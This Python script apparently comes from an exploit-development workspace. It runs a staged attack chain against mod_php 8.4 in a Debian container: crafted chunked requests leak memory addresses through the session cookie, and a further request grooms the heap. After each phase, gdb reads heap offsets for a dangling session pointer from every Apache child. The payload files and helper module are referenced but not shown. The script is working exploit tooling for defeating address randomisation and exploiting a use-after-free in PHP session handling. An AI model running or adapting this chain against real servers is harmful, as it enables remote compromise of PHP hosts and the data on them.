#!/usr/bin/env python3
"""Debian 13 package heap-state diagnostic: A1/B1 leak + A2 groom under gdb.

Runs the standard blind A1/B1/A2 sequence, but after each phase reads
ps_globals / alloc_globals out of every prefork child with gdb (the package's
own dbgsym is installed in the container).  Prints the actual heap base, the
stale PS(id) offset and the dangling PS(http_session_vars) offset, so the
S anchor can be compared with the blind leak's main bucket.
"""
import json, os, subprocess, sys, time, urllib.parse

D = "/tmp/opencode/research/modphp_84_matrix_20261023T074116Z"
sys.path.insert(0, os.path.join(D, "scripts"))
import chain84 as C

CNAME = "m109-d8424pkg"
PORT = 18740
LOG = "/var/log/apache2/p2s-access.log"
GDB_SCRIPT = "/tmp/deb_state.gdb"


def sh(cmd, **kw):
    return subprocess.run(cmd, capture_output=True, text=True, **kw)


def pids():
    r = sh(["docker", "exec", CNAME, "sh", "-c",
            "ps -eo pid,user,comm | awk '$2==\"www-data\"&&$3==\"apache2\"{print $1}'"])
    return [int(x) for x in r.stdout.split()]


def state(pid):
    r = sh(["docker", "exec", CNAME, "gdb", "-batch", "-p", str(pid), "-x", GDB_SCRIPT])
    for line in r.stdout.splitlines():
        if line.startswith("DEBSTATE"):
            return dict(kv.split("=", 1) for kv in line.split()[1:])
    return {"err": (r.stdout + r.stderr).strip().splitlines()[-1:] or ["no output"]}


def log_lines():
    r = sh(["docker", "exec", CNAME, "sh", "-c", "cat %s 2>/dev/null" % LOG])
    return r.stdout.splitlines()


def main():
    os.makedirs(os.path.join(D, "out/debdiag"), exist_ok=True)
    rec = {"phases": {}}
    print("== restart", flush=True)
    sh(["docker", "restart", CNAME])
    time.sleep(2.0)
    print("children:", pids(), flush=True)

    before = log_lines()
    n0 = len(before)

    # --- A1 ---
    a1 = os.path.join(D, "bodies/a1.bin")
    q = "?q0000000=v&q0000001=v&q0000002=v&q0000003=v&q0000004=v"
    save = os.path.join(D, "out/debdiag/a1.resp")
    pr = C.send_chunked(PORT, "/index.php" + q, a1, save)
    pr.wait(timeout=300)
    a1r = open(save, "rb").read()
    rec["phases"]["A1"] = {"status": a1r.split(b"\r\n", 1)[0].decode("latin1"),
                           "bytes": len(a1r)}
    time.sleep(0.3)
    new = log_lines()[n0:]
    rec["phases"]["A1"]["log"] = new
    print("A1", rec["phases"]["A1"], flush=True)
    rec["A1_state"] = {p: state(p) for p in pids()}
    print("A1 children:", json.dumps(rec["A1_state"], indent=1), flush=True)

    # --- B1 x5 (same driver as the chain) ---
    n1 = len(log_lines())
    procs = []
    for i in range(5):
        s = os.path.join(D, "out/debdiag/b1_%d.resp" % i)
        procs.append((i, s, C.send_chunked(PORT, "/index.php", os.path.join(D, "bodies/b1.bin"), s)))
    for i, s, p in procs:
        try:
            p.wait(timeout=300)
        except subprocess.TimeoutExpired:
            p.kill()
    time.sleep(0.3)
    rec["phases"]["B1"] = {"log": log_lines()[n1:]}
    hit = None
    for i in range(5):
        data = open(os.path.join(D, "out/debdiag/b1_%d.resp" % i), "rb").read()
        row = {"i": i, "bytes": len(data),
               "status": data.split(b"\r\n", 1)[0].decode("latin1")}
        if b"Set-Cookie: PHPSESSID=" in data:
            try:
                info = C.parse_leak(data, 0x424ff0)
                row.update({"decoded": info["decoded"], "lib": hex(info["lib"]),
                            "cands": info["cand_counts"],
                            "main0": hex(info["main_candidates"][0]) if info["main_candidates"] else None})
                if info["main_candidates"] and hit is None:
                    hit = info
            except Exception as e:
                row["leak"] = "err:%s" % e
        rec["phases"]["B1"][i] = row
        print("B1", row, flush=True)
    rec["B1_state"] = {p: state(p) for p in pids()}
    print("B1 children:", json.dumps(rec["B1_state"], indent=1), flush=True)

    # --- A2 ---
    n2 = len(log_lines())
    a2 = C.a2_body()
    resp = C.send_plain(PORT, "/index.php", a2)
    rec["phases"]["A2"] = {"status": resp.split(b"\r\n", 1)[0].decode("latin1"),
                           "bytes": len(resp)}
    time.sleep(0.3)
    rec["phases"]["A2"]["log"] = log_lines()[n2:]
    print("A2", rec["phases"]["A2"], flush=True)
    rec["A2_state"] = {p: state(p) for p in pids()}
    print("A2 children:", json.dumps(rec["A2_state"], indent=1), flush=True)

    if hit:
        rec["leak"] = {"lib": hex(hit["lib"]), "cands": hit["cand_counts"]}
    json.dump(rec, open(os.path.join(D, "out/debdiag/diag.json"), "w"), indent=1)
    print("saved out/debdiag/diag.json", flush=True)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
